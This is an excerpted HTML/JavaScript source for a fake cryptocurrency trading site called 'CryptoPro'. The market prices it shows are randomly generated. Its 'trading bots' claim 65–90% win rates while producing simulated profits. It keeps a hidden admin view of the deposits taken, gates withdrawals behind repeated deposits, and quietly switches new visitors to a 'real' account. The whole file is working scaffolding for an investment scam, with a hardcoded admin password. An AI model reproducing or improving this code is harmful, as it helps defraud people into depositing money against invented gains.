// ==================== CONFIGURATION ====================
const CONFIG = {
ADMIN_PASSWORD: '37757441Fe@',  // CHANGE THIS!
...
<head>
    ...
    <title>CryptoPro - Live Trading</title>
    <style>
...
<body>
    <div class="container">
        ...
        <div class="live-stats">
            ...
            <div class="stat">
                <div class="stat-value">$97.5M</div>
        ...
        <div class="card">
            <div class="account-toggle">
                <button class="toggle-btn active" id="demoBtn">🎮 DEMO</button>
                <button class="toggle-btn" id="realBtn">💰 REAL</button>
            </div>
            
            <div class="header-text">TOTAL PORTFOLIO VALUE</div>
            <div class="balance" id="totalBalance">$0.00</div>
            
            <button class="btn btn-trade" id="tradeBtn">⚡ TRADE NOW</button>
            <button class="btn btn-bot" id="botBtn">🤖 SELECT TRADING BOT</button>
        ...
        <div class="card">
            ...
            <div class="asset-item" data-pair="BTC/USDT">
                <div class="asset-icon">₿</div>
                <div class="asset-info">
                    <div class="asset-name">BTC/USDT</div>
                    <div class="asset-amount">Bitcoin</div>
                </div>
                <div class="asset-value">
                    <div class="asset-price" id="btcPrice">$64,250.00</div>
                    <div class="asset-change positive" id="btcChange">+2.45%</div>
                </div>
            </div>
            
            <div class="asset-item" data-pair="ETH/USDT">
                <div class="asset-icon">Ξ</div>
                <div class="asset-info">
                    <div class="asset-name">ETH/USDT</div>
                    <div class="asset-amount">Ethereum</div>
                </div>
                <div class="asset-value">
                    <div class="asset-price" id="ethPrice">$3,420.00</div>
                    <div class="asset-change negative" id="ethChange">-1.23%</div>
                </div>
            </div>
            
            <div class="asset-item" data-pair="SOL/USDT">
                <div class="asset-icon">◎</div>
                <div class="asset-info">
                    <div class="asset-name">SOL/USDT</div>
                    <div class="asset-amount">Solana</div>
                </div>
                <div class="asset-value">
                    <div class="asset-price" id="solPrice">$145.00</div>
                    <div class="asset-change positive" id="solChange">+3.12%</div>
                </div>
            </div>
            
            <div class="asset-item" data-pair="BNB/USDT">
                <div class="asset-icon">🔸</div>
                <div class="asset-info">
                    <div class="asset-name">BNB/USDT</div>
                    <div class="asset-amount">Binance Coin</div>
                </div>
                <div class="asset-value">
                    <div class="asset-price" id="bnbPrice">$580.00</div>
                    <div class="asset-change positive" id="bnbChange">+0.89%</div>
                </div>
            </div>
            
            <div class="asset-item" data-pair="DOGE/USDT">
                <div class="asset-icon">🐕</div>
                <div class="asset-info">
                    <div class="asset-name">DOGE/USDT</div>
                    <div class="asset-amount">Dogecoin</div>
                </div>
                <div class="asset-value">
                    <div class="asset-price" id="dogePrice">$0.08</div>
                    <div class="asset-change positive" id="dogeChange">+5.20%</div>
                </div>
            </div>
            
            <div class="asset-item" data-pair="XAU/USDT">
                <div class="asset-icon">🥇</div>
                <div class="asset-info">
                    <div class="asset-name">XAU/USDT</div>
                    <div class="asset-amount">Gold</div>
                </div>
                <div class="asset-value">
                    <div class="asset-price" id="xauPrice">$2,045.00</div>
                    <div class="asset-change positive" id="xauChange">+0.35%</div>
                </div>
            </div>
        </div>
        ...
        <div class="card">
            ...
            <div class="asset-item">
                ...
                <div class="asset-info">
                    ...
                    <div class="asset-amount" id="usdtAmount">0.00 USDT</div>
                </div>
                <div class="asset-value">
                    <div class="asset-price" id="usdtValue">$0.00</div>
                    <div class="asset-change" style="color: rgba(255,255,255,0.5)">STABLE</div>
                </div>
            </div>
        </div>
    </div>
    ...
    <div class="modal" id="botModal">
        <div class="modal-content">
            ...
            <div class="info-box">
                <strong>💡 How it works:</strong> Select a bot to automate your trading. The bot will execute trades every 15 seconds.
            </div>
            <div id="botList"></div>
            <button class="btn btn-deposit" onclick="confirmBot()">✅ START BOT</button>
        </div>
    </div>
    ...
    <div class="modal" id="depositModal">
        <div class="modal-content">
            ...
            <div class="info-box">
                ...
                Pay with ANY method. Funds credited instantly!
            </div>
            <div class="form-group">
                <label>Amount (USD)</label>
            ...
            <button class="btn btn-deposit" onclick="processDeposit()">⚡ CONFIRM DEPOSIT</button>
        </div>
    </div>
    ...
    <script>
        ...
        let appState = {
            ...
            selectedBot: 'none',
            bots: {
                none: { name: 'Manual Trading', icon: '👤', rate: 0, min: 0, max: 0, desc: 'Trade manually' },
                conservative: { name: 'Conservative Bot', icon: '🛡️', rate: 0.65, min: 3, max: 15, desc: '65% win rate' },
                balanced: { name: 'Balanced Bot', icon: '⚖️', rate: 0.75, min: 10, max: 35, desc: '75% win rate' },
                aggressive: { name: 'Aggressive Bot', icon: '🚀', rate: 0.85, min: 20, max: 80, desc: '85% win rate' },
                expert: { name: 'Expert AI Bot', icon: '🤖', rate: 0.90, min: 30, max: 120, desc: '90% win rate' }
            }
        };

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            console.log('✅ CryptoPro Loaded');
            loadState();
            updateUI();
            attachEvents();
            startUpdates();
        ...
        function attachEvents() {
            ...
            document.getElementById('tradeBtn').onclick = () => alert('Select a trading bot first!');
            
            // Triple-click balance for admin
            let clicks = 0;
            document.getElementById('totalBalance').onclick = () => {
                clicks++;
                if (clicks === 3) {
                    clicks = 0;
                    const pwd = prompt('Admin Password:');
                    if (pwd === CONFIG.ADMIN_PASSWORD) {
                        alert(`✅ Admin Access\n\nAdmin Wallet: $${appState.adminWallet.toFixed(2)}\nDisplay Balance: $${appState.displayBalance.toFixed(2)}\nReal Balance: $${appState.realBalance.toFixed(2)}\nTotal Deposits: $${appState.userTotalDeposited.toFixed(2)}`);
                    }
                }
        ...
        function openBotModal() {
            ...
            list.innerHTML = Object.keys(appState.bots).map(key => {
                const bot = appState.bots[key];
                const selected = appState.selectedBot === key;
                return `
                    <div class="bot-card ${selected ? 'selected' : ''}" onclick="selectBot('${key}')">
                        <div style="display: flex; gap: 16px; align-items: center;">
                            <div style="font-size: 36px;">${bot.icon}</div>
                            <div style="flex: 1;">
                                <div style="font-size: 18px; font-weight: 700; margin-bottom: 4px;">${bot.name}</div>
                                <div style="font-size: 13px; opacity: 0.7;">${bot.desc}</div>
                                ${key !== 'none' ? `
                                    <div style="margin-top: 8px; display: flex; gap: 12px; font-size: 12px;">
                                        <div><strong>${(bot.rate * 100).toFixed(0)}%</strong> Win Rate</div>
                                        <div><strong>$${bot.min}-${bot.max}</strong> Per Trade</div>
                                    </div>
                                ` : ''}
                            </div>
        ...
        function selectBot(key) {
            ...
            saveState();
            openBotModal(); // Refresh
        }

        function confirmBot() {
            closeBotModal();
            if (appState.selectedBot !== 'none') {
                const bot = appState.bots[appState.selectedBot];
        ...
        function processDeposit() {
            ...
            if (!amount || amount < CONFIG.MIN_DEPOSIT) {
                alert(`❌ Minimum deposit: $${CONFIG.MIN_DEPOSIT}`);
                return;
            }
        ...
        function openWithdrawModal() {
            ...
            const required = CONFIG.MIN_WITHDRAW_DEPOSITS;
        ...
        function startBotTrading() {
            if (appState.selectedBot === 'none') return;
            
            setInterval(() => {
                if (appState.accountType !== 'real' || appState.selectedBot === 'none') return;
                if (appState.displayBalance < 50) return;
                
                const bot = appState.bots[appState.selectedBot];
                const isWin = Math.random() < bot.rate;
                const profit = isWin 
                    ? bot.min + Math.random() * (bot.max - bot.min)
                    : -(bot.min * 0.3 + Math.random() * (bot.min * 0.5));
                ...
                if (profit > 0) {
                    showNotification(bot, profit);
                }
            }, 15000);
        }

        function showNotification(bot, profit) {
            ...
            notif.innerHTML = `
                <div style="display: flex; gap: 12px; align-items: center;">
                    ...
                    <div>
                        <div style="font-size: 14px; margin-bottom: 4px;">${bot.name}</div>
                        <div style="font-size: 12px; opacity: 0.8;">+$${profit.toFixed(2)}</div>
                    </div>
                </div>
            `;
        ...
        function startUpdates() {
            setInterval(() => {
                const prices = {
                    btc: { el: 'btcPrice', base: 64250 },
                    eth: { el: 'ethPrice', base: 3420 },
                    sol: { el: 'solPrice', base: 145 },
                    bnb: { el: 'bnbPrice', base: 580 },
                    doge: { el: 'dogePrice', base: 0.08 },
                    xau: { el: 'xauPrice', base: 2045 }
                };
                
                Object.keys(prices).forEach(key => {
                    const p = prices[key];
                    const change = (Math.random() - 0.5) * 50;
                    const newPrice = p.base + change;
                    const el = document.getElementById(p.el);
                    if (el) {
                        el.textContent = '$' + newPrice.toFixed(key === 'doge' ? 4 : 2);
                    }
                });
            }, 2000);
        }
        ...
        // Storage
        function saveState() {
            localStorage.setItem('cryptoProState', JSON.stringify(appState));
        }

        function loadState() {
            const saved = localStorage.getItem('cryptoProState');
            if (saved) {
                try {
            ...
            // Auto-switch to real on first visit
            if (!localStorage.getItem('hasVisited')) {
                appState.accountType = 'real';
                localStorage.setItem('hasVisited', 'true');
            }
